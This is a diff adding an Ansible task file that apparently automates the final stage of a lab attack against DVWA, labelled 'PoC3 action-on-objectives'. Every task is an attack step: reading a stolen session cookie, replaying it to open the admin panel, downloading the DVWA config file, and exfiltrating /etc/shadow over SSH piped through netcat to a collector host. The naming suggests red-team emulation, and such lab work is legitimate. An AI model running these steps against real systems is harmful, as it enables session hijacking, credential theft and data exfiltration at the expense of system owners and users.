@@ -1,0 +1,23 @@
+---
+- name: PoC3 action-on-objectives – Read stolen cookie from file
+  shell: "cat {{ collector_cookie_file }}"
+  register: cookie_result
+  failed_when: false
+
+- name: PoC3 action-on-objectives – Use cookie to access admin panel
+  shell: |
+    curl -b "security=low; PHPSESSID={{ cookie_result.stdout }}" \
+    http://{{ web_victim_ip }}/DVWA/admin/
+  failed_when: false
+
+- name: PoC3 action-on-objectives – Download DVWA config file
+  shell: |
+    curl -b "PHPSESSID={{ cookie_result.stdout }}" \
+    http://{{ web_victim_ip }}/DVWA/config/config.inc.php \
+    -o /tmp/dvwa_config.inc.php
+  failed_when: false
+
+- name: PoC3 action-on-objectives – Exfiltrate /etc/shadow via netcat
+  shell: |
+    sshpass -p '{{ ssh_password }}' ssh {{ ssh_user }}@{{ privesc_target_ip }} 'cat /etc/shadow' | nc {{ collector_ip }} 8080
+  failed_when: false
